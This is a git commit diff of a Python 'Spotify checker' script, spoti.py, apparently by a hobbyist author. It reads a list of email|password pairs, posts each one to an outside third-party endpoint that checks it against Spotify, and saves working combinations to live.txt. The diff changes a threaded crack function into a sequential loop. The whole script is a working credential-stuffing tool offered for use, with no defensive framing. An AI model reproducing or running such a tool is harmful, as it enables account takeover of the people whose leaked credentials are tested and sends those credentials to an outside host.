c2f1aca3eafc4c666c9108467fb28109f28ab889
NOOBIE <44431105+KANG-NEWBIE@users.noreply.github.com>
2019-03-15 16:39:46 +0700

    Add files via upload

--- spoti.py
+++ spoti.py
@@ -1,8 +1,11 @@
 #!usr/bin/python3.7
 #Author : KANG-NEWBIE
 
-from multiprocessing.pool import ThreadPool
-import requests, os
+try:
+	import requests, os
+except Exception as ex:
+        print("[Module not found] %s"%(ex))
+        exit("[Tips] pip install requests")
 #color
 g='\033[1;32m'
 r='\033[1;31m'
@@ -13,34 +16,33 @@ til=0
 pul=[]
 pek=[]
 
-def crack(email):
-	global tol,til,pek
-	til+=1
-	req=requests.post("https://api.dw1.co/spotify/v2/check",data={"email":email,"password":tol[til-1]})
-	if "true" in req.text:
-		pek.append(email)
-		open("live.txt","a+").write("%s|%s\n"%(email,tol[til-1]))
-		print("[%sLIVE%s] %s -> %s"%(g,nc,email,tol[til-1]))
-	else: print("[%sDIE%s] %s -> %s"%(r,nc,email,tol[til-1]))
 os.system('clear')
-print("""	  C H E C K E R
-   ___|    _ \    _ \ __ __| _) 
- \___ \   |   |  |   |   |    | 
+print("""         C H E C K E R
+   ___|    _ \    _ \ __ __| _)
+ \___ \   |   |  |   |   |    |
        |  ___/   |   |   |    | Author : KANG-NEWBIE
  _____/  _|     \___/   _|   _| Contact: t.me/kang_nuubi
-                                
+
                                 """)
 try:
-	print("[#] file harus berisi 'email|password'")
-	o=open(input("%s[!] file list: "%(nc))).read().splitlines()
+        print("[#] file harus berisi 'email|password'")
+        o=open(input("%s[!] file list: "%(nc))).read().splitlines()
 except Exception as f:
-	exit("[file not found] %s"%(f))
+        exit("[file not found] %s"%(f))
 for x in o:
-	k=x.split("|")
-	tol.append(k[1])
-	pul.append(k[0])
-p=ThreadPool(10)
-p.map(crack,pul)
+        k=x.split("|")
+        tol.append(k[1])
+        pul.append(k[0])
+s=len(tol)
+while til < s:
+	til+=1
+	req=requests.post("https://api.dw1.co/spotify/v2/check",data={"email":pul[til-1],"password":tol[til-1]})
+	if "true" in req.text:
+		pek.append(pul[til-1])
+		open("live.txt","a+").write("%s|%s\n"%(pul[til-1],tol[til-1]))
+		print("[%sLIVE%s] %s -> %s"%(g,nc,pul[til-1],tol[til-1]))
+	else: print("[%sDIE%s] %s -> %s"%(r,nc,pul[til-1],tol[til-1]))
+
 print("-"*30)
 print("[!] Live: %s"%(len(pek)))
 print("[!] Result saved: live.txt")
